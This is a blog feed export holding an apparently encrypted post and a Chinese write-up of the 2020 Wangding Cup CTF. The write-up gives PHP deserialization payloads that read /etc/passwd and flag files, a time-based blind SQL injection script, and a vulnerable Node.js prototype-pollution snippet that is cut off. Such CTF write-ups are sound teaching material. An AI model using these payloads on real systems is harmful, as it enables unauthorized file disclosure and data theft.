1bdc4e44531a31dcd66673c1d6612c6bc836bb45b799d0711fcf66707a65dece87f055d2a1a88e62749cdd869e7464aacd634dc0e2ae1c9d400e3b28cd0719bf7cc7b54f01879c460218f1d0f7671d9eae24a200628b8809677cac6b254075d699cfed33b3c85792db91665f761780aefabe00ab6e1b18305a067eea588fab5fb35201bc3789ae5b8a9bcf6fa313fd557e2d5307cb30aac226f9467f3f96189e589567e635650d33c5c15c38a5b530cacfeb34cda88bdf32a1c6b849b41b9ffc4e30eb353dafc5ef99840720dfb2b38a8f63e93f56ef83468f84f18bd02f3d2f3392751ccffe072b8cba88f021fe0389564b0abd5f3b72f602ca40d13e34c671f29e55df00d7a27e9711dbc102ff4550e624232dec08d0797c936b76860f7b112cb3518f183a7b64bd4761eab5884317a01e7989281b44090d4f3ee8eeea4fca84c74412e2724e57d6feb05e7023d9f09a1ffef8e471bf4d95659dc33721c951d965d6a09fbce2cb1a2a6511f4cbf05939d0c554b603d9f0d3e275155f30fa4529c7b6e9544fb5bb71d45c61c264c2fb745fc0a83b32c7af198546dd24a6921164911a2330a20d1222dcb5dc1039d51d6c32bd558963a9a17e70069bb14a6eea2f426bbd57ceb379732fa9f281eb8682766c80abd1f19cb562cd0d8bbac02ec3e1364c0e628a9683b754a6648f9cb96ea0af4c30fe9024361203799103018b43e473d74c65217e6b812808b1703d313d8b95a3b7b00de83ad167b586ce81e4c5b1203804e755a8433a2d220b544cca72d69c5288f1f3a53b7a6190e554da37eb9db7add79a4928d99faa62cc78a4cb2b8c608dee6b550c2409b18ce493586c46b352814bfd4bb716ee37bdb9938ef716fccf5936ca3ea2a56cba338da54018d39b82943a6481332b57fa9ed5896d1bed95a7269801b9c13422b1b6c7e2810ea76ce739bef1c03e23417c9ef98add4428e67b9aa6c525bb7a85216eaba767910a077082661caad04367a923366a00cb76523760d8bb16e0b7897bb80c1bbe5616f7bd2806727cf17a919f96fe7241fdcdcd55f5a47d987fddfeee32c1e9ada603025668265c9216fc1f0728160ef44fa0602464f5de340ae7abe42dd09df36be51cac60abffb958cc0b1208a8e6855665c48652753f07ea2990f2845207b121a05519e4c9cde107333569bcac2aeedfd0ab74787e75a77045516eb9f24bed1bae7d03874276407aa34a82f701dd9917f03d1f4645d724afc0ef8872719c05763ff93028f501a4db56fdfd911917899be8ff2a8c0051aa1d959e4903628dda2a3680a43fde987dc8f2198868b2c48adfb1e0e22e5bf9557a20950c2221506e9ce7df1881f9e360f37eb8d83ec2cbb658559cc4a35d6eb245317471d90f7c60a972e4e6f613b7712035303dc7d87d5929b4ef853727c3dacc523019b44e3b990e3483f29e6056be95d2b9ce2f509aaa0c1147e1e0346b15e1b9f425c32d2db317a8722638cecd7247bf0dab9d4a9653b98bfcfe2cddc5c8a5445d41e0c3db5d5777f5d23990008769e108046405eb826553834f853df17bd6de930bd220b0390f15ee9218a58ee5065bcd583d301d2365d13f112da116ff7739e19ec53d79dfa71a988722f93071cabc4e3dd5acbb0173e5e3bbd9542d72325571c690a3f517c74f22b5664e264ba235580433c6514ae56c2ca23ce377630dbf74f335cf5ddba6f8b4fb02e5c7234373ba125b7e59d83e437c82064da8afda9a31578c24770b78058691b3dc230f1305c839859c51b296fa8a8a3920f7e48006b2844df5779a35c0cae2b84ebaf268be7c2cf22645b2e3f93f0d41c0707dc6bbb621d3da20bba59a2ec6226fc88ff243f57e140dbf81171c18d100d9b38a18a49c93c133e0c81ba3cda013eb8d5d0a969ea22bc7df0a41c818125a93f2bb8b65fa39ee6665252f440b79fb0ec557223c0f2a35e0731ede48d4bdcbf65e8fc1eda10e66d2448be5f8ad25034b064a90732d13c371a117e737e72b48578a374afbaddd7855ac975f1110218c268ced57fce1b70cf830f439a3daf6260202673087a53c607395e4584552f6c9bdbe975ddcadcca6ae21382e683bc554881629db0aa5e21e4d82a83cffb671617cb73b23e3b4f8f2443773681230f9aba151b4e70c43233827fad3f75ca143d4f9dc24742b9becfa4c23e3b523840ed99729e7dc9c07b0b2b982922edfcc905607641ce54e477430053590b23e8c618098ef65b60740b1d9655f430a76d809d6ceef337ae8e0dc766d9347b256785eb6631ae254570a2bfd3122b47a749e77b342a883276a42a6137d79bb80e2153b01cbe20814b7168d364fcff00084ffef1970aad38d9c765ddaf53cd09b8a9f21424e5b81233b9ad0e18c1081e04a34e96383eee4feb87c20b3e7bfc650d568928d8b1dfef509c839578b034c21ce1a472d5bf6313775275deac209bdb091cd9f1ecbce7cadc521d74ff7caa60bb3b4efd163ea2aee3764368adefd41dc4c21ac67eb01c89925ac39d5a4215cf1a87816566dcad70a842b3c6570cbb3b4412bf36af5f88e6d8932d3c28b704d38e25748cefa7307c5add6e563386778cfcb65d6643b6796084b65c8d3a7d491fc43407213982649dba357692dac90564bee6aa10ae4d603d6104b7f8a986e934a385a4c176656bdca708ed4cdde65808ea733bb8b8bf42a7a6f54a39fcb28e53d6e4b8983c026c72a5efae9e0d1df50ecbc394a60cb2eb7b8ff323c04127e09ff9b98dc946f1b13c8619166c263ca3ae5230734b3127ddc730b8aa63470c77a1e33f2e9e3a9806711eea6bcd14087470d74d37c53a1d9c1c29af61860de2e8bfd5a9a7334fa0b1378f15ec30d48c1674b9c9907ad43de9cf085c260d1d030b4d4454da068f63cc15a0c651f02d4420057c6b36b16b4feb28e3fcd0c3e6c6ac767a2638d9987f43bd69e32b6b8cbfc627c9fafb3dffee0a172c750b82405465006cf8cbb4c0fc2833040c09f9ae8da747a1e1b74f152bf087431a0857cec162537dd2d11211481b0de11be1fb3bf3878ccaeeaa6e74357b9b051eabd808217dcdf3f02ecd00998a340918796e63bf51c8ead1a5b44d0614f6efce76b340d7db6a03c63fcb596fa43abb279465a2c289d02358ebcc0b3c04cd42a21c29539f2ed92b0f1401bed2a135b4d2f83139c70a205e1d4b9e633b29db403b825ab7f1f2d52e32052b86d56c143ca847427e4650a51e207ae09e6f5220c53a313b694e290dff5b1f9cd850bd3b0abef58fe4c82522bacb25640b19aacc81a8d5d73ecfe70d5b5ec79612f09c11e99257b4d7cb02dbf2c2de98181fea3b239b108ba68e4b4faba49e94376b1d5f297b6adc81f992c99bef4ce39fb54ef82a7adf019f26718899b11fb8777302b4074280dddb1ad4fb965e6ed862be8470c23292533a8fbbcd75223109aa498a540205daa26f473b73b6b21e49f29d747d5510cacea247e56df1648a841048d00e7251c8ae3e5c3a817353ca292fb73e42765a69e6024d8e09813d65865885db124594e14385e2cff5b8670220f3132255a178a00a11f41fd41acb4965c147bf9a57f578547bbd0ea6c6bc59cd42b734e9f20dc22b7bd11fe048d11db787cbe604be962bbf3e63a06d0c7d8de454af0b355e783d615ecf0922468db921952317660140a1aebe5951a5c46172ebbbdee097ea04338385abbc12a4366843dfde81dba1c4ae82263893855f6dfbff5b4d9f84e4cf276d8d0c56e00c1eadec00d6cc77605562a84928d49521d129cc898119d1d94b24c5805a8b0e3381216f7080eacab3732a6341d7315a9daa7196c592aeb5898dcac0ef80ec78504b45be460c74d8a46d55719f88c71bf18c8403040d1d76bd8b874f46967d0396fa0723c267ea6e3b008ea0324e343a2906e2f75f86c0f4b1151bbd1a4d37f4105f6dfad70048833a335296a22ef34431be2a72879a7dbd97b76a653a21e31c497122cb362eb7089b53a72cd7aa83b34214330ceacf89baaa4fd3d30dfd5802c7439b36c571fee2f72e81186d172dfa57a90705779d18d39a85f6466d95ad142fa66a8ce9e6fe420b3ea8b1102b6640a6ecb01e19ab18c2d1232fea9fc336aa77eb6caeb88362f6d2c331ec861a718583da01ed8f1f659815532a49fa378eb417e822c283d7d09332c41c406c375ee41bdaf5f5abd9efabab695facd668a6493b6711fe9a41d2ada71e98882cf934cce786a70658e05f6c61819e0518937ae19f7973730b42c8dadf14c01f10bf2bc864ec6c88eb3671fade6aeb4f2a1b686c2839e211924309c3bfabe9f443d20494c2f3235a3e4c86b478de2eaa60819c589b9bb8bdbe0ad9e781fc401553befb3de2577a4832e76f761029eb6c4a887b1d3dd535faf43ac53fefb696ee786b776979129eb167089454da3421efc12a9512ffa18ff9e405539cab5b495b622e95bf6eb673200d962c0de810d9bff3bb8877c209d2708a314a96af3e9c69456f4324a478f5893cc8389bade55490d78c255de69a904a122e22c7b85fa78f2004ab0c1b0a7f6df22aa7e6323125b808c8ac17a4753ce21232260d3e464c5a352434ecb33258b5c88c0251364bfe4788279e2277bbc5b8c9e3c169239df28868967e5465898772f165e4ae52d370e68d6981f7707ed04ce3995d707dcf3e87403f5b936647cf05748d00fff209faf92762734fffa95b58f77c4c5d13f98b0619831f6229a0f0dd58bdf4c5bb1c9ae24741ec2ded1afe018841ab73c974a89358601f9495b9f18e3e3dbe451e995e3b1b3bcec8a7da56c4f9fd1594d730931f862b08d6cfa226688f7be72085d15281c68b3c2450ab68bef185b6805757c7c5850c9aee23a9e02d7ac176ebd17386ed380dd7e1097917b1b492f2ca27d1e265e77a2d07fe51b3949824e75e773cb3d616dc03b0acbe5da79f67257dbb3648397d5daff8ddffef0e97b62928d7ecb3faa9c66f573257644a6b6477f7136951750d544ab84da4a76c77d36a02391ae00495766064b75ccf69f6441bad3dbafecf17844e40d8163667127d2fff094575cf0e74c8159fc819fcff7907cd8a1e500b6da2361b995b9f7e3540bb140d680874fb660af4ae62e8e5c738614563f8fc884d665c3804580079cf4dc79b69508496d86a69933a6afe0cd5366dc57657079445f1836796307a40aa4a163288c086ec4cf61f1ea4ed9f1fd1ffbfea115334ec72664c8c2d3572eb4bf2a0ecadcae87428ef875094b7ed64bf5ade9f36b99f20268065225199af76083e2b3fc99f2072a2ca9f0bf01738119db768cdf72f930f8748d58284df739ddd84c081cd0bb9a070e12775714b8bbcfc5e68b1175a1cde87e62097e6454ba0eaa764b5ffff82927f9b58323621204d3f37a45a7944b2aa37e7b5d2754235c274bbce1aa35acc0d31d56644cf8e1b5c7963358b5a358671e7657b841bd4826639de703874e8db572cb49363a8c488661568979aeccbda94966932a63cbeec180fd70e93d5d138b70e39fb41f2e2397f7abaa4045bfe6a7dd6017f7f766ed81ee15d4c441c7ff72ad0ab1afc47ed813636676d10188671eaaa904a4ec5567d21c87e4030b84f1469cfed6617cb03af6a8ff85ce80f004a3ffc8b9b30cef5b0b5dee3794b2b214c315ae5f92c424afeb5241cfefeaac76290ae42fe806d069a22dc6bb3ff04cd9cd2689ec26bb7eeda68ecca11e1158cdfc788335d23ac8b6869947a5de6f95e315adbe9542d53b1ae832b07b06cb2f5b1244924904b75cf8f3326f14e25c818ec284060589d0b5642a3a35f120adb083c8d367733f7d9dd6071e27f3769e52a617adbe57a55a94cc8d2d70195fde64fcd182fca77e0a8e2f98b48c4961c180a6b04b05a95ce34553c8d2252d1d6c3ef707bb7fbf8ef011034f32a3437e4f24a063dea7702607261ff6d17ebcb827d138fb6df2e6a11529c26a4a0419ac27412cfa0685ee828aac71b371538d8684c45213554d6364074fd55d21998c0ddf90db0cec9ccad95c15bb84d24a0a7576d3e1445a221da804950d9925fb96f5fbcc1f838ca42753141894ef995c18641b865515fc39107ca76f2ffaebbbdf4bb501ad4d65524320f0cc35530a6fc966719d6174b3505ed39623b05bc6cb7462285b3bd979a97be18ec757fc7ea86ced16647c9928a7d0b2352bee699b1d285656f180ea36011796f85a01cdd4c140d2e0f07ab78367b6cc6189e4fdbece272f20f00e6c8cf589ce349d9da9c5befce5edddbaf3069663761d394c782e71d42c786a311409a96fcb5abc5be8edff4ba8184cc0d58d0a50c54cd4c44dd213f8b3ad864ebac6d4bcda789e20dae0e46c8e056c830b38604cd183d0198551ac072432f5e1ed22aa61069ce08d88df9737316ebcadb9245889a7ae22ec43bb6abc48974b425d0358268f16381c07acd5656ed2a71dbc72e6f121bc8dca6173904878e3fb105dc431ec4cde602cfb827a3a3a5a670dbd62e30022a86e1a724a3223ca831a578214490f7d1ee3fec635d01948f97067704861e39b0e25f3f914a471ad38a67fe9c1cfcdf2c6356e8e4672a61416b96691d1c812381e55b340fb88e7b273048fccebfeb2e3f34e17a13e4fd16979d42fb29073ccfb0a90aabd82497bf59deb67c639f073f9051d7a6d1f4df08c248394aa4ead162aa0e7ded5ed23b1be9475296647f345aaae0e3e5d0c71bfb520004348788602e4aeeba5a610e9ed5b6bbbe534a79dccda63201727723430dad10c3bf4c3413d0dbd651138f9b78148b72edaf73e5de9c179b09f46e550881db93a0c7d5829c08ce4bce4715e7cfd955f85b4023eccfd9b70fe6ae3e8adf3a38b1f7cc4aa4a4ecba9119d64ac4f277fe4e1bb66c661ba040d16ef3d0c1c2546f8bbf609f4ef74a968e2f547aa78c937fbd155388b5db87990d203288de6c413fe29c373b70119fd403e444d52064bfd8789cff323025990eb1d8e13648eb4514a8bc00f8f39f385f008082942a1133c7d2d352733ddc38eb668007d07991e2400c8f44509ec39b517b385e0c7acd0bf0c5d836896989237f6e5a0e2bcff0cff8fa57cf5338392a45fa0ad430d1702c239093af46770770e50d1917ee73152a1ba2f949930a895ca65a6d1331dc3615c2d4ad54297da3a44008cd4963fe294b8c293d58cb68f3c7693a4b9f8365f95edf13acaa52cd717574be46d245d0da699a78b278c36682375e220c5fdd180ca7212a91f86a684b676387c84160de79eb8e542329ec59c750407451053afbb53f4376b444e9d2d31a84f26bc4d3229548592a2f2fda98b2da69edc4ca31ef019806ec4ba532d1d5499d149d062e331aa58614ebb2e67cb3007b0e3bee1faec401dbc9558bf05f524be290311265357dae1fed21e79a50d0b52c25a1dadb59ef1c1e35a207df769dc75c0e8ac2de8a52cb66eee0baa89a821c4fe0372e4fb619e956b61bd5a585ea56df8cb82c4bdf5a00631ead76a2cace0f242a389a873055b5daf927a39b1de410ce655cee4e23d7ef27746a9d336d6e8a68a0315d15cec2d585caed37d6d2d0616f2146fdea123979cf44fe2c5a3969abac80a93e2ed95660921d2ba5cccd7a7bc8f22b6a3bd93cb62feee44c156b1cd72cbbbc8fc48f31c6290fea9241fb462b3075fac1a83efe41fa2b77acd78a7825ae1fd297677ffb11b1cfc0ca6e949af95296c8e5922e56f404ca5d98471b7af26d273c17c5eac9beef7808354c2bcafebc258af2908a9d90403cf908fd8a4cffd3c6026e4ff9a876797fecf9f47ebe96784ba74abac6af92164efdb1964c15b4d802bdfae6f6aedfcaa8a2bd0992b055aa048a6dc9a8c1a813b39296190c92b221efa318fd9b0a67abe38a8b19a6f5e79b30aca60f20c8abb0e1d7c79551bb218f504782fcdac56f17b2cb598067e65b0bcde45edf7627c1e094e7110bb65f6b9d521cff3eaf632b41b791d3810b85b2c8b35f8bfaa9aa6c5c7280416f2b1ded7ee093f3b01db2d995c09a0c96eb793997044b75471463a6024c2e8cc0041390c1bcd4283137bcee910fc3a13a9f89d82f39a4181bdf01e560a17435e380c92db8bea2f7213918838ded8e3c9cf7cd07f9cc656fcd6b1446f00b2a97a13fd09eb807ed42c46c05f7d91c46d1729d71702ec0654beb9830724efb8a6187bc23b81e9617dfb2049004ad7cbd6a685793a5b2d44e0d9acfa4be9bd95b394b7eaf77526dc1e5ac6a8beedceb361f29110eeb00c00fa62b98d78dae77afd323fd47474acb405c56ea779f7aac1f353722f46c2f45de4ac008a705a09c541f8a406de3ac3dddb35cae23d47744312c6877d0b5cb5392a0da93dab94b54b97226e09167fa0187f1aae95dc0456cdc4f565cc3fb2e4c960874a6d8cf46dd779007a2002f30693ffa1ee8af15f5197ddf48d02637fbaccd4485752c7b365bada42838ac1d09ba4c980c771cd1819f05c42662cc6953ed3e27aaa03b72f8a2306c59012388d14b86efc8c5897553d08ffb7479f1ccfe36f8750b361b5ddcc8fc45c6db2f82395992e67f9d50e7014925cc5eb25cbc9307186e16a659ac70847364d59e14f58fa0dde6510395b765b1d313642e6d3d39dddd3e446e01eb39427f21efe68c5852f744db0a13da525ae4f7abda4d7fe0c83e786c1fb20d5102f0d82e3fcd5aa77f76fbcb1f0232dc1e3e945e3dacf65385a7c1521bec91d92fe6d46e155bf820925570d36244ce8550af52262a34aa50931ca49e11d9382bbae3fae705d80ece21adf43c16994288ace22fe84226a7be68b885984d25cf468670f014b4a5c3d415a97b372b331c2220d28dcc23d186cd3d03b4cea2fb77cc21ca9a2228219ac1e3e63bb49b4e053c375a23f344ae3a4f69fc1121e6843dc44c8712e4b78743c1a11ab565b6725d5712ff60f658716c75e726a46f32dcdf42f1a902ac75fece8a295dae0b0acf94b05f1d0b5dba79015859b57bad83a84f600492417e340da7ac6912b3d07588720b401856a934b0214155e1e31993a2bae82df719d11a21c0bfa724ce4a0fc1ecec0019b2816e1af4d9c1f1e09b6de938d5428008c9d9964ebeefe6ff520b8161828ecded174c8e3e3c72cf51596f09f7da31b1e4f66df5752004d697978cc5c9c71fe41e4177cb0e134531e881a872b1956c7430e6307202fd7d6fea89798de9099ff28cbe05e3ca64756aace3b8a6b0d3b01f92c54010ac6410b44f1824c454f06ac57eaad41707d9c3e754ce2c2e9644bdaaf53f3d64287ae8cfa1e2d9269f8b531fa0e0c5f3cbf5eeb4355d7a458096c784b308edcfc49b0f10f57c3aeafb10d0ab3cba9ff7821250586f6649345d95a667c1a03c13f249ccc0d1f182e5afb5ec3ee11735b85d9124d32e6449308cd097b86cc7581af245902ad82547cb0aeb95d079cb2373ca4a78a6958b9a72ae8c3c36fdd9e8ae4011da8c7ea71fd88d6761ecd465325abcf1de5221d525a556a808d195ddc291f2edd86c0b1b55b96998dae9e9e948d6f97989912af1fbb64be25902a191af9532f5c20df382f64d00138c1a984304f207fc6be7af21dbaffb33b444731c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 网鼎杯 青龙之战 部分题解</title>
    <url>/2020-WDB-Azure-Dragon/</url>
    <content><![CDATA[<p><strong>She1don</strong>，永远滴神。</p>
<span id="more"></span>
<h3 id="misc">Misc</h3>
<h4 id="签到">签到</h4>
<p>访问<strong>/static/index.js</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">IAvaDcnZ</span>1 = <span class="string">&quot;icq68ec6e55677aaff76e5818cf3f46a&quot;</span>;</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;\x66\x6c\x61\x67\x2e\x70\x68\x70&#x27;</span>,</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&#x27;\x50\x4f\x53\x54&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: <span class="string">&#x27;\x74\x6f\x6b\x65\x6e\x3d&#x27;</span> + <span class="title class_">IAvaDcnZ</span>1,</span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">StRvT3</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StRvT3</span> = <span class="title class_">StRvT3</span>;</span><br><span class="line">    <span class="variable language_">console</span>[<span class="string">&#x27;\x6c\x6f\x67&#x27;</span>](<span class="title class_">StRvT3</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag&#123;69c748d2e8723246f27d6b66464289b9&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="web">Web</h3>
<h4 id="areuserialz">AreUSerialz</h4>
<h5 id="解法一">解法一</h5>
<p><strong>PHP</strong>高版本可以使用<strong>public</strong>绕过，直接构造如下，可以读取<strong>/etc/passwd</strong>，无法读到<strong>flag.php</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">FileHandler</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// /?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A55%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
<p>读取<strong>/etc/apache2/httpd.conf</strong>发现<strong>web</strong>目录在<strong>/web/html/</strong>下，遂读取<strong>/web/html/flag.php</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=/web/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">FileHandler</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// /?str=O%3A11%3A&quot;FileHandler&quot;%3A3%3A%7Bs%3A2%3A&quot;op&quot;%3Bi%3A2%3Bs%3A8%3A&quot;filename&quot;%3Bs%3A62%3A&quot;php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fweb%2Fhtml%2Fflag.php&quot;%3Bs%3A7%3A&quot;content&quot;%3BN%3B%7D</span></span><br><span class="line"><span class="comment">// flag&#123;48c0cb43-93a5-4e1d-989a-9f95082a2a1b&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="解法二">解法二</h5>
<p><strong>P</strong>牛去年八月曾在圈子里发过的一篇文章，指出可以用大写的<strong>S</strong>来表示字符串，此时后面的字符串可以使用<strong>16</strong>进制来表示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:5:&quot;&lt;null_byte&gt;South&lt;null_byte&gt;&quot;		-&gt;		S:5:&quot;\00South\00&quot;</span><br></pre></td></tr></table></figure>
<p>因此在这里可以这样构造。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=/web/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\00&quot;</span>, <span class="string">&quot;\\00&quot;</span>, <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s:&quot;</span>, <span class="string">&quot;S:&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">FileHandler</span>()))));</span><br><span class="line"><span class="comment">// /?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22%5C00%2A%5C00op%22%3Bi%3A2%3BS%3A11%3A%22%5C00%2A%5C00filename%22%3BS%3A62%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fweb%2Fhtml%2Fflag.php%22%3BS%3A10%3A%22%5C00%2A%5C00content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
<h4 id="trace">trace</h4>
<p>有点恼人的是一旦超过二十条记录就要重置容器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f17a46f20e89437da0bc1c200f3e295bec352db6a69b4911.cloudgame2.ichunqiu.com/register_do.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">126</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;2&#x27;^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,exp(999) or sleep(5),exp(999)) and &#x27;1&quot;</span>&#125;</span><br><span class="line">        s = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        e = time.time()</span><br><span class="line">        <span class="keyword">if</span> e - s &gt; <span class="number">5</span>:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># flag&#123;792319d7-ccfd-4f7b-ac20-c5cf5bf206a6&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="notes">notes</h4>
<p><strong>Nodejs</strong>原型链污染，<strong>CVE-2019-10795</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">  <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">  <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">……</span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            